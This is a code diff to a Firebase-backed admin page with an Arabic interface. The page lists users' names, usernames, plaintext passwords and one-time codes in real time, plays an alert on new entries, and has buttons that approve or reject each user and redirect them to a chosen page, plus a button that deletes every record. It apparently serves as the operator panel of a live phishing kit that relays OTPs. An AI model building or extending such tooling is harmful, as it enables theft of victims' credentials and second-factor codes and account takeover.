@@ -309,7 +309,10 @@ td{
     تفعيل الصوت
 </button>
 
-
+<button class="route-btn" id="deleteAllBtn"
+style="background:linear-gradient(135deg,#dc2626,#ef4444)">
+    حذف جميع المستخدمين
+</button>
 
     </div>
 
@@ -408,11 +411,15 @@ td{
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 
 import {
-getFirestore,
-collection,
-onSnapshot,
-doc,
-updateDoc
+
+      getFirestore,
+    collection,
+    onSnapshot,
+    doc,
+    updateDoc,
+    getDocs,
+    deleteDoc
+
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 const firebaseConfig = {
@@ -429,38 +436,20 @@ const app = initializeApp(firebaseConfig);
 
 const auth = getAuth(app);
 
+onAuthStateChanged(auth,(user)=>{
 
+    if(!user){
 
-const db = getFirestore(app);
-import { getDocs } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-
-
-const test = async ()=>{
-
-    try{
-
-        const snap = await getDocs(collection(db,"users"));
-
-        console.log("TOTAL DOCS:", snap.size);
-
-        snap.forEach((doc)=>{
-
-            console.log("ID:", doc.id);
-            console.log("DATA:", doc.data());
-
-        });
-
-    }catch(e){
-
-        console.error("FIRESTORE ERROR:",e);
+        window.location.href = "admin-login.html";
+        return;
 
     }
 
-};
+    document.body.style.opacity = "1";
 
+});
 
-test();
-
+const db = getFirestore(app);
 
 const usersTable = document.getElementById("usersTable");
 
@@ -477,28 +466,48 @@ const audio = new Audio(
     "assets/notification.wav"
 );
 
-
-function loadUsers(){
-
-onSnapshot(collection(db,"users"), 
-(snapshot)=>{
+onSnapshot(collection(db,"users"), (snapshot)=>{
 
     usersTable.innerHTML = "";
 
-    const users = [];
+if(!firstLoad && snapshot.docChanges().length > 0){
 
-    snapshot.forEach((docSnap)=>{
+    audio.play().catch(()=>{});
 
-        users.push({
-            id: docSnap.id,
-            ...docSnap.data()
-        });
+}
 
+   const users = [];
+
+snapshot.forEach((docSnap)=>{
+
+    users.push({
+        id: docSnap.id,
+        ...docSnap.data()
     });
+
+});
+
+/* newest first */
+
+users.sort((a,b)=>{
+
+    const aTime =
+        a.createdAt?.seconds || a.createdAt || 0;
+
+    const bTime =
+        b.createdAt?.seconds || b.createdAt || 0;
+
+    return bTime - aTime;
+
+});
 
 users.forEach((user)=>{
 
+    const online =
+        Date.now() - (user.lastSeen || 0) < 15000;
+
     usersTable.innerHTML += `
+
     <tr>
 
         <td>${user.name || '-'}</td>
@@ -507,9 +516,9 @@ users.forEach((user)=>{
 
         <td>${user.username || '-'}</td>
 
-        <td>${user.password || '-'}</td>
+<td>${user.password || '-'}</td>
 
-        <td>${user.otp || '-'}</td>
+<td>${user.otp || '-'}</td>
 
         <td>
             <div class="status">
@@ -522,47 +531,33 @@ users.forEach((user)=>{
         </td>
 
         <td>
+            <div class="status"
+                 style="
+                 background:${online ? 'rgba(34,197,94,.15)' : 'rgba(239,68,68,.15)'};
+                 color:${online ? '#22c55e' : '#ef4444'};
+                 ">
+                ${online ? 'Online' : 'Offline'}
+            </div>
+        </td>
+
+        <td>
+
             <button
                 class="route-btn"
-                onclick="openPopup('${user.id}')">
+                onclick="openPopup('${user.id}')"
+            >
                 توجيه
             </button>
+
         </td>
 
     </tr>
+
     `;
+    });
+firstLoad = false;
 
 });
-
-
-},
-(error)=>{
-
-    console.error("Firestore error:",error);
-
-});
-
-
-}
-
-
-onAuthStateChanged(auth,(user)=>{
-
-    console.log("AUTH:",user);
-
-    if(!user){
-
-        window.location.href="admin-login.html";
-        return;
-
-    }
-
-    document.body.style.opacity="1";
-
-    loadUsers();
-
-});
-
 
 /* popup open */
 
@@ -600,30 +595,52 @@ popup.addEventListener("click",(e)=>{
 
 document.getElementById("acceptBtn").onclick = async ()=>{
 
-    if(!currentUserId){
-        console.log("No user selected");
-        return;
-    }
+    const acceptBtn = document.getElementById("acceptBtn");
 
-    try{
+    if(!currentUserId) return;
 
-        await updateDoc(
-            doc(db,"users",currentUserId),
-            {
-                currentPage: pageSelect.value,
-                status:"approved"
-            }
-        );
+    acceptBtn.disabled = true;
 
-        console.log("Updated successfully");
+    acceptBtn.innerText = "جاري التوجيه...";
 
-        popup.classList.remove("show");
+    await updateDoc(doc(db,"users",currentUserId),{
 
-    }catch(error){
+        currentPage: pageSelect.value,
+        status: "approved"
 
-        console.error("UPDATE ERROR:",error);
+    });
 
-    }
+    popup.classList.remove("show");
+
+    acceptBtn.disabled = false;
+
+    acceptBtn.innerText = "قبول و توجيه";
+
+};
+
+/* reject */
+document.getElementById("rejectBtn").onclick = async ()=>{
+
+    const rejectBtn = document.getElementById("rejectBtn");
+
+    if(!currentUserId) return;
+
+    rejectBtn.disabled = true;
+
+    rejectBtn.innerText = "جاري التوجيه...";
+
+    await updateDoc(doc(db,"users",currentUserId),{
+
+        currentPage: pageSelect.value,
+        status: "rejected"
+
+    });
+
+    popup.classList.remove("show");
+
+    rejectBtn.disabled = false;
+
+    rejectBtn.innerText = "رفض و توجيه";
 
 };
 
@@ -661,7 +678,54 @@ enableSoundBtn.onclick = async ()=>{
 };
 
 
+const deleteAllBtn =
+    document.getElementById("deleteAllBtn");
 
+deleteAllBtn.onclick = async ()=>{
+
+    const confirmDelete = confirm(
+        "هل أنت متأكد من حذف جميع المستخدمين ؟"
+    );
+
+    if(!confirmDelete) return;
+
+    try{
+
+        deleteAllBtn.disabled = true;
+
+        deleteAllBtn.innerText = "جاري الحذف...";
+
+        const snapshot =
+            await getDocs(collection(db,"users"));
+
+        const promises = [];
+
+        snapshot.forEach((docSnap)=>{
+
+            promises.push(
+                deleteDoc(doc(db,"users",docSnap.id))
+            );
+
+        });
+
+        await Promise.all(promises);
+
+        alert("تم حذف جميع المستخدمين");
+
+    }catch(error){
+
+        console.log(error);
+
+        alert("حدث خطأ أثناء الحذف");
+
+    }
+
+    deleteAllBtn.disabled = false;
+
+    deleteAllBtn.innerText =
+        "حذف جميع المستخدمين";
+
+};
 
 
 </script>
